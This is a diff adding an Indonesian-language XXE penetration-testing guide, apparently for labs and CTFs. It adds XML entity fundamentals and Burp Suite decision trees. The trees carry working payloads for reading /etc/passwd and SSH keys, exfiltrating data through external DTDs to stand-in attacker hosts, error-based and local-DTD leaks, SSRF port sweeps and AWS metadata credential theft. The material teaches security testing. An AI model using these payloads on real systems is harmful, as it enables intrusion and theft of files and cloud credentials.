@@ -26,6 +26,7 @@ refs_in: ["20","22","30"]
 
 ## 📚 Daftar Isi
 
+- [Fundamental: Memahami XXE](#-fundamental-memahami-xxe)
 - [Pre-Flight](#-pre-flight-setup-environment)
 - [Master Workflow](#️-master-workflow)
 - [FASE 0: Attack Surface](#fase-0-identifikasi-attack-surface)
@@ -43,6 +44,186 @@ refs_in: ["20","22","30"]
 - [Troubleshooting](#️-troubleshooting)
 - [Final Checklist](#-final-checklist)
 - [Cross-Workflow Links](#-cross-workflow-links)
+
+---
+
+## 🧠 Fundamental: Memahami XXE
+
+> Baca ini sebelum masuk ke workflow. Bagian ini membangun fondasi konseptual — banyak keputusan di decision tree akan lebih masuk akal setelah memahami ini.
+
+---
+
+### Anatomi Dokumen XML
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE rootElement [
+    <!-- Internal DTD — tempat entity didefinisikan -->
+    <!ENTITY nama "nilai">
+    <!ENTITY % param SYSTEM "http://attacker/evil.dtd">
+]>
+<rootElement>
+    <child>isi konten biasa</child>
+    <data>&nama;</data>    <!-- general entity dipanggil di XML body -->
+</rootElement>
+```
+
+Tiga lapisan penting:
+
+```text
+1. XML Declaration    →  <?xml version="1.0"?>  —  metadata versi dan encoding
+2. DOCTYPE + DTD      →  mendefinisikan entity, schema, referensi eksternal
+3. Element tree       →  konten dokumen yang sebenarnya
+```
+
+XXE terjadi di lapisan **DOCTYPE + DTD** — bukan di element tree. Parser memproses `<!ENTITY ... SYSTEM "...">` **sebelum** konten dokumen diproses.
+
+---
+
+### Tiga Jenis Entity yang Wajib Dipahami
+
+|Jenis|Deklarasi|Cara Panggil|Context Valid|
+|---|---|---|---|
+|**Built-in**|(sudah ada di spec)|`&lt;` `&gt;` `&amp;` `&quot;` `&apos;`|Di mana saja|
+|**General entity**|`<!ENTITY nama "nilai">`|`&nama;`|XML body|
+|**Parameter entity**|`<!ENTITY % nama "nilai">`|`%nama;`|**DTD only**|
+
+**General entity** (`&nama;`) → digunakan di **Fase 1–2** (file read, SSRF): parser memasukkan nilai entity langsung ke XML body sebelum response dikembalikan.
+
+**Parameter entity** (`%nama;`) → digunakan di **Fase 3** (blind XXE, external DTD exfil, error-based): hanya valid di dalam DTD, tidak bisa dipanggil di element tree.
+
+Keduanya berbeda secara fundamental — jangan tertukar saat membangun payload.
+
+---
+
+### SYSTEM Keyword: Pintu Masuk XXE
+
+Tambahkan `SYSTEM "..."` pada entity declaration → parser akan **fetch resource tersebut** sebelum dokumen diproses:
+
+```xml
+<!ENTITY xxe SYSTEM "file:///etc/passwd">       ← baca file lokal dari filesystem
+<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">   ← HTTP request ke service internal (SSRF)
+<!ENTITY xxe SYSTEM "http://attacker/evil.dtd"> ← fetch external DTD (OOB exfil)
+```
+
+**Ini adalah mekanisme inti XXE.** Parser yang meresolve `SYSTEM` entity tanpa restriksi = vulnerable. Attacker hanya perlu mengontrol XML yang dikirim ke parser tersebut.
+
+---
+
+### Mengapa Parser Bisa Vulnerable?
+
+External entity resolution seringkali **aktif secara default** di banyak parser dan framework lama karena fitur ini memang berguna secara legitimate (memuat DTD standar, referensi dokumen, dll). Keamanan bukan prioritas desain awal XML.
+
+|Environment|Default Behavior|Catatan|
+|---|---|---|
+|libxml2 + PHP (< 8.0)|✅ Aktif — vulnerable|Paling umum ditemukan di lab & CTF|
+|Java Xerces (konfigurasi lama)|✅ Aktif — vulnerable|Enterprise apps lama|
+|.NET XmlDocument (konfigurasi lama)|✅ Aktif — vulnerable|ASP.NET legacy|
+|PHP 8.0+|❌ Disabled secara default|Masih bisa di-enable|
+|Python lxml|❌ Disabled secara default|Safe by default|
+|Java + hardened config|❌ Disabled via XMLInputFactory|Perlu konfigurasi eksplisit|
+
+Jika developer tidak secara eksplisit menonaktifkan external entity resolution → semua resource yang bisa diakses oleh server process menjadi attack surface.
+
+---
+
+### Empat Komponen XXE — Mengapa Keempatnya Harus Ada
+
+> Sumber: One-Sentence Rule di awal dokumen ini.
+
+```text
+XML Parser        →  server memproses XML yang dikirim attacker
+Entity Resolution →  parser meresolve <!ENTITY xxe SYSTEM "...">
+External Resource →  parser mengakses file:/// atau http://
+Observable Channel→  attacker dapat melihat hasilnya
+```
+
+**Jika salah satu komponen tidak ada:**
+
+|Komponen Hilang|Gejala yang Terlihat|Alternatif yang Bisa Dicoba|
+|---|---|---|
+|XML Parser|XML tidak diterima / 415|File upload (SVG, DOCX) → Fase 5|
+|Entity Resolution|DOCTYPE diblok / entity literal muncul|XInclude → Fase 1.4|
+|External Resource|Permission denied / timeout konstan|Coba resource lain (hostname, hosts, proc)|
+|Observable Channel|Response kosong, tidak ada error apapun|Setup OOB channel → Fase 3|
+
+Workflow ini bergerak dari komponen paling dasar (apakah parser menerima XML?) ke yang paling kompleks (apakah ada channel untuk mengekstrak data?).
+
+---
+
+### Kategori Serangan XXE
+
+|Kategori|Kondisi|Teknik|Fase|
+|---|---|---|---|
+|**In-Band / Direct**|File content muncul langsung di response|`SYSTEM "file:///..."` → terbaca di body|Fase 2|
+|**Blind / OOB**|Entity resolved, output tidak di-reflect|External DTD + HTTP/DNS callback|Fase 3.3|
+|**Error-Based**|Parser error message terlihat di response|Data disisipkan ke path invalid → muncul di error|Fase 3.4 / Fase 6|
+|**SSRF via XXE**|Parser melakukan HTTP request ke internal|`SYSTEM "http://127.0.0.1:PORT/"`|Fase 4|
+
+---
+
+### Aturan Kritis: Parameter Entity Nesting
+
+**Konsep ini menjelaskan hampir semua keputusan di Fase 3 — dan sumber utama kebingungan antara internal DTD vs external DTD.**
+
+#### Aturan XML Spec
+
+Parameter entity (`%nama;`) **tidak boleh di-nest** di dalam Internal DTD Subset. Ini bukan bug — ini adalah aturan XML spec (XML 1.0 §4.4.8).
+
+```xml
+<!-- ILEGAL per XML spec — error di parser spec-compliant: -->
+<!DOCTYPE root [
+    <!ENTITY % file SYSTEM "file:///etc/passwd">
+    <!ENTITY % send SYSTEM "http://attacker/?d=%file;">  ← ERROR: %file; di sini = nesting dilarang
+    %send;
+]>
+```
+
+#### Solusi Standar: External DTD
+
+Pindahkan logika ke file DTD terpisah yang dihosting di server attacker. Di external DTD context, nesting **legal**:
+
+```xml
+<!-- xxe.dtd — file di server attacker — nesting legal di sini: -->
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://attacker/?d=%file;'>">
+%eval;
+%send;
+```
+
+> **Mengapa `&#x25;` di dalam string value?** Di dalam nilai string entity declaration, karakter `%` harus di-escape sebagai `&#x25;` agar parser tidak menginterpretasinya sebagai parameter entity reference secara prematur. `&#x25;` = `%` dalam HTML/XML numeric character reference. Ini adalah behavior yang valid dan spec-compliant di external DTD.
+
+#### libxml2 Extension (Parser-Specific, Non-Spec)
+
+libxml2 — parser yang digunakan PHP di Linux — memperbolehkan `&#x25;` di dalam internal DTD sebagai ekstensi non-standard. Ini yang membuat teknik **Error-Based (Langkah 3.4)** bisa bekerja di internal DTD:
+
+```xml
+<!-- Hanya bekerja di libxml2/PHP — bukan XML spec behavior: -->
+<!DOCTYPE foo [
+    <!ENTITY % file SYSTEM "file:///etc/passwd">
+    <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+    %eval;
+    %error;
+]>
+```
+
+Java Xerces dan .NET mengikuti spec lebih ketat → konstruksi ini ditolak.
+
+#### Perbandingan Tiga Teknik No-Outbound
+
+|Teknik|Butuh Outbound?|Kompatibilitas Parser|Kapan Digunakan|
+|---|---|---|---|
+|External DTD + OOB|✅ Ya|Semua parser|Ada outbound HTTP/DNS|
+|Local DTD Repurpose (Fase 6)|❌ Tidak|Parser-agnostic|Tidak ada outbound, ada local DTD, error visible|
+|Internal DTD `&#x25;` trick (Fase 3.4)|❌ Tidak|**Hanya libxml2/PHP**|Tidak ada outbound, tidak ada local DTD, parser **verified** libxml2/PHP, error visible|
+
+**Urutan prioritas yang benar ketika no outbound + error visible:**
+
+```text
+1. Coba Local DTD Repurpose (Fase 6) → parser-agnostic, lebih reliable
+2. Jika tidak ada local DTD DAN parser verified libxml2/PHP → coba Fase 3.4
+3. Kegagalan Fase 3.4 di parser non-libxml2 = limitasi teknik, bukan false negative XXE
+```
 
 ---
 
@@ -94,11 +275,16 @@ START: Endpoint menerima XML / File Upload
 │   ├─ [SSH private key]           → Direct SSH login → SSH workflow
 │   └─ [PHP source + special chars] → php://filter/base64-encode
 │
-├─ FASE 3: Blind XXE
-│   ├─ [OOB HTTP works]   → External DTD exfiltration (3.3)
-│   ├─ [OOB blocked]      → DNS via Collaborator / interactsh (3.2)
-│   ├─ [Error visible]    → Error-based exfil (3.4)
-│   └─ [No outbound]      → Repurpose Local DTD (3.5 / Fase 6)
+├─ FASE 3: Blind XXE [decision → TREE 4]
+│   ├─ STEP 1: Apakah OOB HTTP/DNS tersedia?
+│   │   ├─ YES → External DTD exfiltration (3.3)
+│   │   └─ NO  ↓
+│   └─ STEP 2: Apakah error message visible di response?
+│       ├─ YES → Local DTD repurpose (3.5/Fase 6) [prioritas: parser-agnostic]
+│       │         OR error-based [parser-specific: libxml2/PHP only] (3.4)
+│       │             — gunakan (3.4) hanya jika local DTD tidak tersedia
+│       │             & parser/version sudah diverifikasi
+│       └─ NO  → stop / reassess attack surface
 │
 ├─ FASE 4: XXE → SSRF
 │   ├─ [Internal service] → Probe endpoint (Burp Intruder port sweep)
@@ -128,6 +314,421 @@ LEVEL 4  Data exfiltration (OOB atau Error-based)
 LEVEL 5  SSRF  http://127.0.0.1:PORT/
   ↓
 LEVEL 6  Local DTD repurpose (tanpa outbound)
+```
+
+---
+
+## 🌳 Interactive Decision Guide
+
+> **Cara Baca:** Ikuti alur dari atas ke bawah. Setiap cabang menunjukkan tindakan di **Burp Suite** beserta hasilnya — `✅ BENAR` = respons yang diharapkan, `❌ ERROR` = apa yang terjadi jika gagal dan apa langkah alternatifnya. Setiap Tree saling terhubung — ikuti penunjuk `→` ke Tree berikutnya.
+
+---
+
+### 🔷 TREE 1 — Deteksi & Konfirmasi XXE
+
+```text
+START: Endpoint XML ditemukan di Burp HTTP History
+       (Proxy → HTTP History → filter MIME Type: XML)
+│
+▼
+[Burp Repeater] Kirim XML Baseline — Fase 1.1
+POST /product/stock
+Body: <?xml version="1.0"?><stockCheck><productId>1</productId>...</stockCheck>
+│
+├─ ✅ BENAR  — 200 OK, data normal diproses
+│   └─ → Parser menerima XML. Lanjut: Test Internal Entity ▼
+│
+└─ ❌ ERROR  — 415 Unsupported Media Type
+    └─ Di Repeater, ubah Content-Type:
+       Content-Type: text/xml
+       Content-Type: application/xml; charset=utf-8
+       │
+       ├─ ✅ Setelah ganti → 200 OK : Lanjut Test Internal Entity ▼
+       └─ ❌ Masih error → Cek endpoint lain di HTTP History
+                          atau langsung File Upload path → TREE 6
+
+▼
+[Burp Repeater] Test Internal Entity — Fase 1.2
+<!DOCTYPE test [<!ENTITY test "XXE_ENTITY_TEST_123">]>
+<productId>&test;</productId>
+│
+├─ ✅ BENAR  — "Invalid product ID: XXE_ENTITY_TEST_123"
+│   └─ → DTD processing aktif! Lanjut: Test External Entity ▼
+│
+├─ ❌ ERROR  — Entity literal muncul: {"name":"&test;"}
+│   └─ → Entity tidak di-resolve
+│       Coba XInclude → TREE 2
+│
+└─ ❌ ERROR  — "DOCTYPE is disallowed" / 400 Bad Request
+    └─ → DOCTYPE diblok oleh parser
+        ├─ Coba XInclude → TREE 2
+        └─ Coba File Upload → TREE 6
+
+▼
+[Burp Repeater] Test External Entity / File Read — Fase 1.3
+<!ENTITY xxe SYSTEM "file:///etc/hostname">
+<productId>&xxe;</productId>
+│
+├─ ✅ BENAR  — "Invalid product ID: web01"
+│   └─ → ✅ XXE CONFIRMED! Lanjut baca file sensitif → TREE 3
+│
+├─ ✅ BENAR (tapi output kosong) — {"productId":""}
+│   └─ → Entity resolve tapi konten tidak di-reflect
+│       → Blind XXE! Setup OOB listener → TREE 4
+│
+└─ ❌ ERROR  — "Permission denied"
+    └─ → Parser resolve tapi tidak bisa baca file ini
+        Coba file lain di Repeater:
+        file:///etc/hostname  →  file:///etc/hosts  →  file:///proc/version
+```
+
+---
+
+### 🔷 TREE 2 — XInclude Fallback (Jika DOCTYPE Diblok)
+
+```text
+[Kondisi masuk] DOCTYPE diblok atau internal entity tidak di-resolve (dari TREE 1)
+
+[Burp Repeater] Test XInclude — Fase 1.4
+<?xml version="1.0"?>
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+    <xi:include parse="text" href="file:///etc/hostname"/>
+</foo>
+
+ATAU inject langsung ke field form:
+productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+          <xi:include parse="text" href="file:///etc/passwd"/></foo>
+│
+├─ ✅ BENAR  — {"result":"web01"} atau hostname muncul
+│   └─ → XInclude bekerja! Baca file sensitif → TREE 3
+│
+└─ ❌ ERROR  — 400 / output kosong / XInclude tidak di-proses
+    └─ → XInclude tidak di-support parser ini
+        ├─ Ada form upload gambar/SVG? → SVG Upload → TREE 6 (branch SVG)
+        └─ Ada form upload dokumen?   → DOCX Upload → TREE 6 (branch DOCX)
+
+CATATAN: parse="text" wajib — tanpanya parser mencoba parse isi
+         file sebagai XML dan biasanya gagal
+```
+
+---
+
+### 🔷 TREE 3 — File Disclosure (Fase 2)
+
+```text
+[Kondisi masuk] External entity file:/// BEKERJA (dari TREE 1 atau TREE 2)
+
+[Burp Repeater] Baca file sensitif satu per satu — Fase 2.1
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+<productId>&xxe;</productId>
+│
+├─ ✅ BENAR  — root:x:0:0:root:/root:/bin/bash muncul
+│   └─ → /etc/passwd terbaca!
+│       Identifikasi user dengan shell:
+│       grep -v 'nologin\|false' (terminal)
+│       Lanjut baca: .ssh/id_rsa → .env → config.php
+│
+├─ ❌ ERROR  — File muncul tapi XML rusak / terpotong / kosong
+│   └─ → File mengandung karakter XML khusus (<?php, <, >, &)
+│       Gunakan php://filter — Fase 2.2:
+│       <!ENTITY xxe SYSTEM
+│         "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
+│       Output = string base64 → decode di terminal:
+│       echo 'BASE64STRING' | base64 -d
+│       │
+│       ├─ ✅ BENAR  — source code PHP terdecode: DB credentials bocor!
+│       └─ ❌ ERROR  — php:// tidak di-support (bukan PHP server)
+│                      Coba /proc/self/environ atau file plaintext lain
+│
+└─ ❌ ERROR  — File kosong tanpa error, response normal
+    └─ → Entity resolve tapi tidak di-reflect ke response
+        → Blind XXE! Lanjut → TREE 4
+```
+
+---
+
+### 🔷 TREE 4 — Blind XXE Routing (Fase 3)
+
+```text
+[Kondisi masuk] Entity resolve tapi output tidak terlihat di response
+
+LANGKAH A: Konfirmasi OOB HTTP Connectivity — Fase 3.2
+[Terminal 1] python3 -m http.server 8000
+[Burp Repeater] <!ENTITY xxe SYSTEM "http://ATTACKER:8000/xxe-test">
+│
+├─ ✅ BENAR  — 10.10.11.200 GET /xxe-test 200 masuk di terminal
+│   └─ → Outbound HTTP confirmed!
+│       Setup External DTD untuk exfiltrate data → LANGKAH B ▼
+│
+└─ ❌ ERROR  — Tidak ada callback sama sekali (silence)
+    └─ → HTTP egress diblok. Coba DNS via Burp Collaborator:
+        Burp Menu → Collaborator → Copy domain
+        <!ENTITY xxe SYSTEM "http://COLLABORATOR_DOMAIN/">
+        Collaborator window → "Poll now" → lihat DNS query
+        │
+        ├─ ✅ DNS query masuk → Outbound DNS ada
+        │   └─ → Gunakan Collaborator domain sebagai OOB channel
+        │       untuk data exfil → LANGKAH B (ganti ATTACKER dengan Collaborator domain)
+        │
+        └─ ❌ DNS juga tidak masuk → Strict egress filtering
+            ├─ Error message terlihat di response?
+            │   ↓ Ada local DTD di server? (cek Langkah 6.1)
+            │   ├─ YES → TREE 7 (Local DTD Repurpose) [parser-agnostic]
+            │   └─ NO, dan parser verified libxml2/PHP
+            │       → LANGKAH C (Error-Based) [parser-specific]
+            └─ Tidak ada error sama sekali? → LANGKAH D (tidak ada channel tersedia)
+
+LANGKAH B: External DTD Exfiltration — Fase 3.3
+[Terminal 1] Setup xxe.dtd:
+  <!ENTITY % file SYSTEM "file:///etc/hostname">
+  <!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://ATTACKER:8000/?d=%file;'>">
+  %eval; %send;
+[Terminal 1] python3 -m http.server 8000
+[Burp Repeater] <!DOCTYPE foo SYSTEM "http://ATTACKER:8000/xxe.dtd">
+│
+├─ ✅ BENAR  — GET /xxe.dtd 200 + GET /?d=web01 masuk di terminal
+│   └─ → Data berhasil di-exfil via OOB!
+│       Ganti target file di xxe.dtd:
+│       sed -i 's|file:///etc/hostname|file:///etc/passwd|' ~/xxe_loot/dtd/xxe.dtd
+│       Kirim ulang payload di Repeater → observe terminal
+│
+└─ ❌ ERROR  — DTD request masuk tapi tidak ada data callback (/?d=...)
+    └─ → Parameter entity nesting restricted di parser ini
+        Pastikan nested entity ada di External DTD,
+        BUKAN di Internal DTD Subset (rule: &#x25; tidak bisa
+        di-nest langsung di internal DTD → harus via External DTD)
+
+LANGKAH C: Error-Based Exfil — Fase 3.4 [Parser-specific: libxml2/PHP]
+(No outbound + error visible + tidak ada Local DTD yang suitable di server)
+
+Evaluasi kondisi sebelum mencoba:
+  □ Error message dari parser muncul di response? (required)
+  □ Local DTD technique (TREE 7) sudah dicoba dan tidak berhasil? (required)
+  □ Parser diverifikasi libxml2/PHP? (required — bukan fallback universal)
+    → libxml2/PHP: konstruksi &#x25; di internal DTD umumnya supported
+    → Java Xerces / .NET: kemungkinan TIDAK supported → kembali reassess
+
+[Burp Repeater] — jika kondisi likely terpenuhi:
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+  %eval; %error;
+│
+├─ ✅ BENAR  — 400 Bad Request, error message berisi isi /etc/passwd:
+│   "failed to load 'file:///nonexistent/root:x:0:0:root:/root:/bin/bash...'"
+│   └─ → /etc/passwd bocor via error message! Ganti target file
+│
+└─ ❌ ERROR  — 400 tapi error message tidak berisi data file
+    └─ → Parser strip error detail → Coba Local DTD Repurpose → TREE 7
+
+LANGKAH D: Jika tidak ada outbound DAN tidak ada error visible → tidak ada observable channel tersedia → reassess attack surface (cari endpoint lain, file upload path, atau alternative XXE surface)
+```
+
+---
+
+### 🔷 TREE 5 — XXE → SSRF (Fase 4)
+
+```text
+[Kondisi masuk] file:/// bekerja, ingin probe internal services
+
+[Burp Repeater] Test SSRF ke localhost — Fase 4.1
+<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">
+<productId>&xxe;</productId>
+│
+├─ ✅ BENAR  — HTML atau JSON internal muncul di response
+│   └─ → Internal service ditemukan! Explore endpoint
+│       Kirim request baru di Repeater ke path-path internal
+│
+├─ ✅ BENAR (respons 200 tapi body kosong)
+│   └─ → Kemungkinan port open, service tidak return konten
+│       [MEDIUM CONFIDENCE — respons 200 tanpa body bersifat inferential;
+│        parser behavior dapat mempengaruhi interpretasi]
+│       Coba port umum lainnya:
+│       80 | 443 | 8000 | 3000 | 6379 | 27017 | 9200 | 3306 | 5432
+│
+└─ ❌ ERROR  — "connection refused" / timeout di semua port
+    └─ → Sweep port via Burp Intruder:
+        Di Repeater → kanan → Send to Intruder
+        Tab Positions: highlight PORT → "http://127.0.0.1:§8080§/"
+        Tab Payloads: Common ports list dahulu (objective-driven, sesuai scope):
+          80, 443, 8080, 8000, 8443, 3000, 6379, 27017, 9200, 3306, 5432
+        Expand ke range lebih besar hanya jika rules of engagement mengizinkan
+        dan ada justifikasi objektif.
+        Start Attack → sort by Response Length
+        Length/status berbeda dari mayoritas = kandidat port open
+
+[Cloud Metadata] — Fase 4.2 (jika target kemungkinan di cloud)
+
+Langkah 1: Identifikasi provider dari context (hostname, IP range, response headers).
+Langkah 2: Evaluate apakah XXE GET request dapat memenuhi required request semantics:
+  AWS IMDSv1  → GET, no special header → compatible dengan XXE GET
+  AWS IMDSv2  → PUT + X-aws-ec2-metadata-token-ttl-seconds → NOT via XXE
+  GCP         → GET + "Metadata-Flavor: Google" header → NOT via bare XXE GET
+  Azure       → GET + "Metadata: true" header → NOT via bare XXE GET
+
+[Test AWS IMDSv1 — jika target adalah AWS]:
+<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+│
+├─ ✅ BENAR  — ami-id / hostname / iam/ tampil → IMDSv1 accessible
+│   └─ → Step lanjut (each step membutuhkan request XXE terpisah):
+│       .../iam/security-credentials/       → dapat nama role (jika ada IAM role ter-attach)
+│       .../iam/security-credentials/ROLE   → access key + secret + token (jika role exist)
+│       [Credentials hanya tersedia jika instance punya IAM role ter-attach]
+│
+└─ ❌ ERROR  — Timeout / 401 / empty
+    ├─ AWS IMDSv2 aktif → PUT + header token required → tidak via XXE GET
+    │   Document sebagai limitation
+    ├─ GCP target       → Metadata-Flavor: Google header required → tidak via bare XXE
+    ├─ Azure target     → Metadata: true header required → tidak via bare XXE
+    └─ Bukan cloud target / metadata tidak tersedia di environment ini
+```
+
+---
+
+### 🔷 TREE 6 — File Upload XXE (Fase 5)
+
+```text
+[Kondisi masuk] Ada form upload file, direct XML endpoint tidak berhasil
+
+VERIFIKASI DULU — server-side XML parsing:
+Apakah server melakukan server-side parsing, conversion, atau preview terhadap file?
+ ├─ YES → evidence: preview URL, thumbnail generated, conversion output, parser error dari server
+ │        → lanjut ke format-specific path di bawah
+ └─ NO  → file hanya disimpan / dikirim ke browser → BUKAN XXE path via file upload
+          Cari endpoint yang melakukan server-side processing terlebih dahulu.
+
+FORMAT apa yang di-upload?
+│
+├─── FORMAT SVG → Fase 5A (Burp Intercept + Repeater)
+│    │
+│    STEP 1: Proxy → Intercept → ON
+│            Upload file SVG valid kecil di browser
+│    STEP 2: Request tertangkap → klik kanan → Send to Repeater
+│            Proxy → Forward
+│    STEP 3: Di Repeater, ganti body SVG dengan payload XXE:
+│            <?xml version="1.0"?>
+│            <!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+│            <svg xmlns="http://www.w3.org/2000/svg">
+│                <text>&xxe;</text>
+│            </svg>
+│    STEP 4: Klik Send → akses preview URL (GET /files/avatars/xxe.svg)
+│    │
+│    ├─ ✅ BENAR  — Isi /etc/passwd muncul di SVG preview
+│    │   └─ → XXE via SVG confirmed!
+│    │
+│    └─ ❌ ERROR  — SVG diterima tapi tidak ada data
+│        │
+│        ├─ SVG ditolak (wrong MIME/extension)
+│        │   └─ Di Repeater ubah: Content-Type: image/svg+xml
+│        │
+│        └─ SVG diterima tapi tidak trigger XXE
+│            └─ → Server tidak proses XML server-side
+│                Cari endpoint konversi: thumbnail, preview API
+│                Jika tidak ada → coba DOCX path ▼
+│
+└─── FORMAT DOCX → Fase 5B (Manual build di terminal + upload via Repeater)
+     │
+     STEP 1: Buat DOCX payload di terminal:
+             mkdir -p /tmp/xxe_docx/word /tmp/xxe_docx/_rels
+             Edit word/document.xml: masukkan DOCTYPE + entity
+             Buat [Content_Types].xml dan _rels/.rels
+             zip -r /tmp/xxe_payload.docx /tmp/xxe_docx/
+     STEP 2: Intercept upload request di Burp → Send to Repeater
+             Ganti file dengan /tmp/xxe_payload.docx
+     STEP 3: Send → observe response / conversion result
+     │
+     ├─ ✅ BENAR  — File content muncul di response atau preview
+     │   └─ → XXE via DOCX confirmed!
+     │
+     └─ ❌ ERROR  — Upload sukses tapi tidak ada output
+         └─ → Library Office modern sudah disable external entities
+             (python-docx, Apache POI terbaru — hardened by default)
+             Tidak ada bypass jika library sudah patch
+             → Catat sebagai mitigated, cari attack surface lain
+```
+
+---
+
+### 🔷 TREE 7 — Local DTD Repurpose (Fase 6)
+
+```text
+[Kondisi masuk] No outbound HTTP & DNS + error message visible di response
+
+STEP 1: Temukan Local DTD di server — Fase 6.1
+[Burp Repeater] Test path DTD satu per satu:
+<!ENTITY xxe SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+<productId>&xxe;</productId>
+│
+├─ ✅ BENAR  — 400 Error: "entity 'NAMA_ENTITY' already defined at..." (nama bergantung DTD)
+│   └─ → DTD ditemukan! Note nama entity di error — itulah yang bisa di-override.
+│       Contoh di docbookx.dtd: ISOamso [bergantung DTD & versi]
+│       Lanjut: Override Entity + Exfil → STEP 2 ▼
+│
+└─ ❌ ERROR  — "file not found" / no error
+    └─ → DTD tidak ada di path itu. Coba path lain di Repeater:
+        /usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd
+        /usr/share/sgml/docbook/sgml-dtd-4.2-*/docbook.dtd
+        /usr/share/docbook-utils/sgml/docbook/dtd/docbook.dtd
+        /usr/share/sgml/html/4.01/dtd/html401.dtd
+        (Windows: C:\Windows\System32\wbem\cimwin32.dtd)
+        │
+        └─ ❌ Semua path gagal → Local DTD tidak tersedia
+            Teknik ini tidak bisa dipakai di environment ini
+
+STEP 2: Override Entity + Exfil via Error — Fase 6.2
+[Burp Repeater] Payload Local DTD Override:
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+    <!ENTITY % ISOamso '
+        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+        <!ENTITY &#x25; eval
+          "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+    '>
+    %local_dtd;
+]>
+│
+├─ ✅ BENAR  — 400: "failed to load 'file:///nonexistent/root:x:0:0:root:/root:/bin/bash...'"
+│   └─ → /etc/passwd bocor via error — tanpa outbound sama sekali!
+│       Ganti "file:///etc/passwd" di payload untuk file lain
+│
+└─ ❌ ERROR  — 400 tapi tidak ada data di error message
+    └─ → Entity name yang di-override tidak ditemukan di versi/DTD ini.
+        Nama entity (contoh: ISOamso) bergantung pada DTD & versinya.
+        Baca isi DTD yang ditemukan untuk cari entity yang tersedia:
+        <!ENTITY xxe SYSTEM "file:///path/to/local.dtd"> → baca kontennya
+        Cari baris: <!ENTITY % NAMA_ENTITY ...> → gunakan NAMA_ENTITY itu
+        Kemudian ganti "ISOamso" di payload Langkah 6.2 dengan NAMA_ENTITY tersebut.
+
+CARA KERJA (Fase 6.2):
+  1. %local_dtd;     → load DTD lokal dari server itu sendiri
+  2. Sebelum load, entity 'ISOamso' sudah di-override dengan payload kita
+  3. Ketika DTD diproses, 'ISOamso' sudah berisi error chain kita
+  4. %file;          → baca /etc/passwd
+  5. %error;         → buat path invalid berisi isi file → error berisi data
+  6. Tidak butuh outbound HTTP atau DNS sama sekali!
+```
+
+---
+
+### 📊 Quick Routing Table
+
+```text
+Situasi yang Kamu Temukan                        Tree yang Diikuti
+─────────────────────────────────────────────────────────────────────
+Baru mulai, ada endpoint XML                   → TREE 1 (Deteksi)
+DOCTYPE diblok / entity literal tidak resolve  → TREE 2 (XInclude)
+External entity file:/// bekerja               → TREE 3 (File Disclosure)
+PHP file rusak / karakter XML spesial          → TREE 3 (php://filter) [PHP-specific]
+Output tidak terlihat di response              → TREE 4 (Blind XXE)
+Outbound HTTP confirmed                        → TREE 4 Langkah B
+Hanya DNS yang tembus                          → TREE 4 Langkah B (via Collaborator)
+No outbound, ada error message                 → TREE 7 (Local DTD) [prioritas]; TREE 4 Langkah C [parser-specific: libxml2/PHP only, jika local DTD tidak tersedia & parser verified]
+Ingin probe internal services                  → TREE 5 (SSRF)
+Target kemungkinan di cloud (AWS/GCP/Azure)    → TREE 5 (Cloud Metadata)
+  [AWS IMDSv1 only via XXE — IMDSv2/GCP/Azure membutuhkan header yang tidak bisa via GET]
+Ada file upload form (SVG/DOCX)                → TREE 6 (File Upload)
+No outbound total + error visible              → TREE 7 (Local DTD)
 ```
 
 ---
@@ -410,7 +1011,9 @@ echo 'PASTE_PASSWD_CONTENT' | grep -v 'nologin\|false' | cut -d: -f1
 
 ---
 
-### Langkah 2.2 — PHP Source Code via php://filter
+### Langkah 2.2 — PHP Source Code via php://filter `[PHP-specific]`
+
+> **Teknik PHP-specific:** hanya bekerja di server PHP dengan stream wrapper aktif. Bukan fallback universal — tidak tersedia di server Java, .NET, Node.js, dll.
 
 **Gunakan ini ketika:** file PHP mengandung `<?php`, `>`, `&` yang merusak XML parser.
 
@@ -508,7 +1111,17 @@ Content-Type: application/xml
 10.10.11.200 - - "GET /xxe-test HTTP/1.1" 200 -
 ```
 
-➡️ Outbound HTTP confirmed! Lanjut ke **Langkah 3.3**
+➡️ [STEP A: OOB Connectivity — confirmed] ✓
+
+> **OOB Exfiltration memerlukan 3 steps yang BERBEDA:**
+> 
+> - **STEP A — Connectivity proof:** parser dapat melakukan outbound request ✓ (sudah konfirmasi)
+> - **STEP B — Data transport proof:** data dapat benar-benar dibawa via channel
+> - **STEP C — Arbitrary file exfil:** file target compatible dengan transport/encoding/parser
+> 
+> Keberhasilan STEP A **tidak menjamin** STEP C berhasil. File dengan newline, whitespace, XML-special chars (`<`, `>`, `&`), atau URI encoding constraints dapat menyebabkan STEP C gagal walaupun STEP A berhasil.
+
+Lanjut ke **Langkah 3.3** — test data transport
 
 **OUTPUT GAGAL ❌ — Tidak ada callback (silence):**
 
@@ -522,7 +1135,7 @@ Content-Type: application/xml
 
 Di Collaborator window → klik "Poll now" → lihat DNS query masuk.
 
-Jika DNS juga blocked → coba **Error-Based (3.4)** atau **Local DTD Repurpose (3.5)**
+Jika DNS juga blocked → coba **Local DTD Repurpose (3.5/Fase 6)** terlebih dahulu; jika local DTD tidak tersedia dan parser verified libxml2/PHP → coba **Error-Based (3.4)** [parser-specific]
 
 ---
 
